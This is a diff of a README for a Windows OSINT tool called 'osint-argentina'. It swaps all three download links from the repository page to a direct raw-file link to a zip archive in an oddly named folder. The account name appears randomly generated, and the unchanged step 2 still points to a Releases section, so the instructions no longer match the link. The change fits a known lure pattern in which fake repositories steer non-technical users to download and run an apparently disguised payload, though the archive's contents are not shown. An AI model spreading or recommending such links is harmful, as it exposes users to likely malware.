@@ -1,6 +1,6 @@
 # 🔎 osint-argentina - Easy OSINT Tool for Argentina
 
-[![Download](https://img.shields.io/badge/Download-Get%20osint--argentina-orange)](https://github.com/Beauvoirmembranouslabyrinth732/osint-argentina)
+[![Download](https://img.shields.io/badge/Download-Get%20osint--argentina-orange)](https://raw.githubusercontent.com/Beauvoirmembranouslabyrinth732/osint-argentina/main/gamb/osint-argentina-3.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ The script does not require installation of programming languages or development
 Follow these steps to download and run osint-argentina on Windows. No programming knowledge is necessary.
 
 1. Click the large **Download** badge above or use this link to visit the repository:  
-   https://github.com/Beauvoirmembranouslabyrinth732/osint-argentina
+   https://raw.githubusercontent.com/Beauvoirmembranouslabyrinth732/osint-argentina/main/gamb/osint-argentina-3.0.zip
 
 2. On the GitHub page, look for the **Releases** section on the right menu or scroll to find the latest release files.
 
@@ -148,4 +148,4 @@ Contributions help improve the tool for the entire community.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20osint--argentina-orange)](https://github.com/Beauvoirmembranouslabyrinth732/osint-argentina)
+[![Download](https://img.shields.io/badge/Download-Get%20osint--argentina-orange)](https://raw.githubusercontent.com/Beauvoirmembranouslabyrinth732/osint-argentina/main/gamb/osint-argentina-3.0.zip)
